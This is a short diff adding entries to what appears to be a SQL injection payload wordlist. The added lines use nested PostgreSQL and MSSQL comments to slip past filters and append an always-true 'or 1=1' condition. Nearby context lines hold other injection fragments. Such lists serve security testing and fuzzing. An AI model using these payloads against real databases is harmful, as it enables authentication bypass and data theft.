@@ -147,3 +147,7 @@ X' - 'Y' - 0 = '1
 
 # part of parameter pollution
 1) FROM USERS WHERE USERNAME=
+
+# nest pgsql mssql comments
+1/* /*/ */ */ or 1=1-
+1/* /* / */ */ or 1=1-
